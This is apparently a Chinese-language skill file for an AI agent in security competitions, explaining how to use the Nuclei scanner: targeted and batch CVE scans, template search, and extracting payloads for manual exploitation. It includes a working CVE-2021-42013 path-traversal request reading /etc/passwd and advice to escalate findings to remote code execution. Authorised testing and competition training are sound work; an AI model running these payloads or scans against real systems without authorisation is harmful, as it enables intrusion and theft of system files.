---
name: nuclei-scan
description: "Nuclei 漏洞扫描工具使用方法论。当需要对目标进行已知漏洞扫描、CVE 验证、批量 PoC 检测时使用。Nuclei 拥有社区维护的 9000+ 模板，覆盖 CVE、默认口令、配置错误、信息泄露等。任何涉及 nuclei 扫描、CVE 批量验证、PoC 检测、漏洞模板搜索的场景都应使用此技能。也适用于需要从 nuclei 模板中提取 payload 用于手动利用的场景"
metadata:
  tags: "nuclei,scan,cve,poc,vulnerability,漏洞扫描,模板,template,批量检测,projectdiscovery"
  category: "tool"
---

# Nuclei 漏洞扫描方法论

Nuclei 是 ProjectDiscovery 开源的基于模板的漏洞扫描器。它的核心价值：**社区维护的模板库**，每个模板都是经过验证的 PoC，比自己构造 payload 更可靠。

## 扫描策略

Nuclei 有 9000+ 模板，不加限制的全量扫描（`nuclei -u target`）需要 10-30 分钟——在比赛中这是致命的时间浪费。通过 `-t`（指定模板目录）或 `-tags`（指定标签）缩小范围，通常几十秒内就能完成精准扫描。

另外，Nuclei 的模板匹配并非 100% 准确，关键漏洞发现后应手动复现确认，避免在误报上浪费时间。

## Phase 1: 精准扫描（推荐）

根据指纹识别结果选择对应模板，而非全量扫描：

```bash
# 1. 按模板 ID / CVE 编号精确扫描（最快，秒级）
nuclei -u http://target -id CVE-2021-44228

# 2. 按产品名过滤（几十秒）
nuclei -u http://target -t cves/ -tags apache
nuclei -u http://target -t cves/ -tags tomcat
nuclei -u http://target -t cves/ -tags wordpress

# 3. 只扫高危 CVE（1-3 分钟）
nuclei -u http://target -t cves/ -severity critical,high

# 4. 按漏洞类型扫描
nuclei -u http://target -t vulnerabilities/ -tags rce
nuclei -u http://target -t vulnerabilities/ -tags sqli
nuclei -u http://target -t vulnerabilities/ -tags lfi
```

### 常用模板目录

| 目录 | 内容 | 适用场景 |
|------|------|---------|
| `cves/` | 已知 CVE PoC | Zone 2 CVE 验证 |
| `vulnerabilities/` | 通用漏洞检测 | Web 深度测试 |
| `misconfiguration/` | 配置错误 | 云安全、服务加固 |
| `default-logins/` | 默认口令 | 中间件管理后台 |
| `exposures/` | 敏感信息泄露 | 信息收集阶段 |
| `takeovers/` | 子域名接管 | 域名资产攻击 |

## Phase 2: 模板搜索与提取 Payload

当需要手动利用（nuclei 直接扫不出来、需要定制 payload）时，从模板中提取关键信息：

```bash
# 搜索本地模板库
find ~/nuclei-templates/ -name "*CVE-2021-42013*" 2>/dev/null
find ~/nuclei-templates/ -name "*apache*" -path "*/cves/*" 2>/dev/null
find ~/nuclei-templates/ -name "*log4j*" 2>/dev/null

# 按关键词在模板内容中搜索
grep -rl "apache 2.4.49" ~/nuclei-templates/http/cves/ 2>/dev/null
grep -rl "tomcat.*rce" ~/nuclei-templates/http/cves/ 2>/dev/null

# 读取模板提取 payload
cat ~/nuclei-templates/http/cves/2021/CVE-2021-42013.yaml
```

### 模板关键字段解读

```yaml
# 模板结构示例
id: CVE-2021-42013
info:
  name: Apache HTTP Server Path Traversal
  severity: critical           # ← 漏洞等级
  description: ...             # ← 漏洞描述和利用条件

http:
  - raw:                       # ← 原始 HTTP 请求（可直接提取用于 curl）
      - |
        GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:                  # ← 成功判定条件
      - type: regex
        regex:
          - "root:.*:0:0:"

    extractors:                # ← 提取的数据（如版本号、密钥）
      - type: regex
        regex:
          - "root:.*"
```

**从模板提取 payload 用于手动利用**：
```bash
# 从 raw 字段提取请求路径和方法
cat template.yaml | grep -A5 "raw:" 

# 转换为 curl 命令
curl -s "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"

# 如果模板有 POST body
curl -s -X POST http://target/api -d '{"payload": "..."}'
```

## Phase 3: 批量目标扫描

当有多个目标时：

```bash
# 从文件读取目标列表
echo "http://target1" > targets.txt
echo "http://target2" >> targets.txt
nuclei -l targets.txt -t cves/ -severity critical,high

# 配合 httpx 管道
cat urls.txt | httpx -silent | nuclei -t cves/ -severity critical,high
```

## Phase 4: 结果分析与验证

Nuclei 输出格式：
```
[CVE-2021-42013] [http] [critical] http://target/cgi-bin/.%2e/...
[CVE-2022-26134] [http] [critical] http://target/wiki/%24%7B...%7D
```

**必须手动验证关键发现**：
1. 复现 nuclei 报告的请求，确认不是误报
2. 检查利用条件是否满足（如 mod_cgi 是否启用）
3. 尝试从信息泄露升级到 RCE

## 常用标签速查

| 标签 | 说明 | 示例 |
|------|------|------|
| `cve` | 所有 CVE | `-tags cve` |
| `rce` | 远程代码执行 | `-tags rce` |
| `sqli` | SQL 注入 | `-tags sqli` |
| `lfi` | 本地文件包含 | `-tags lfi` |
| `ssrf` | SSRF | `-tags ssrf` |
| `xss` | XSS | `-tags xss` |
| `default-login` | 默认口令 | `-tags default-login` |
| `exposure` | 信息泄露 | `-tags exposure` |
| `apache` | Apache 相关 | `-tags apache` |
| `tomcat` | Tomcat 相关 | `-tags tomcat` |
| `wordpress` | WordPress | `-tags wordpress` |
| `jenkins` | Jenkins | `-tags jenkins` |
| `spring` | Spring 框架 | `-tags spring` |

## 性能优化参数

```bash
# 控制并发（默认 25，目标少时可降低避免被 ban）
nuclei -u http://target -t cves/ -c 10

# 限制速率
nuclei -u http://target -t cves/ -rl 50  # 每秒 50 请求

# 超时设置
nuclei -u http://target -t cves/ -timeout 10

# 只输出发现的漏洞（静默模式）
nuclei -u http://target -t cves/ -silent

# 输出到文件（JSON 格式便于分析）
nuclei -u http://target -t cves/ -json -o results.json
```
